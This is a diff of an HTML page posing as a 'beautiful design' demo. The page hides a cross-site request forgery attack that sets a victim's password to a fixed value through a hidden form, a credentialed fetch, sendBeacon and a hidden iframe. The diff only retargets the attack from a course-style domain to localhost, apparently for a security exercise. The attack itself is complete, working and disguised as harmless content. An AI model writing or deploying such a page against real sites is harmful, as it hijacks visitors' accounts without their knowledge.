@@ -13,7 +13,7 @@
 <h1>Check out this beautiful design</h1>
 <p>This page demonstrates a sleek, modern web design pattern.</p>
 
-<form id="pw" action="https://cats.is-course.ru/settings" method="POST">
+<form id="pw" action="http://localhost:8080/settings" method="POST">
   <input type="hidden" name="password" value="Catadmin1234!q">
   <input type="hidden" name="confirm-password" value="Catadmin1234!q">
 </form>
@@ -47,11 +47,11 @@
   // ---- 2) CSRF transports, fired after probes had time to answer ----
   setTimeout(function () {
     try {
-      fetch('https://cats.is-course.ru/settings', {
+      fetch('http://localhost:8080/settings', {
         method: 'POST', mode: 'no-cors', credentials: 'include',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body
       }).then(function () { ping('CSRF fetch ok'); }).catch(function (e) { ping('CSRF fetch err ' + e); });
-      navigator.sendBeacon('https://cats.is-course.ru/settings',
+      navigator.sendBeacon('http://localhost:8080/settings',
         new Blob([body], { type: 'application/x-www-form-urlencoded' }));
       var ifr = document.createElement('iframe'); ifr.name = 'fw'; ifr.style.display = 'none';
       document.body.appendChild(ifr);
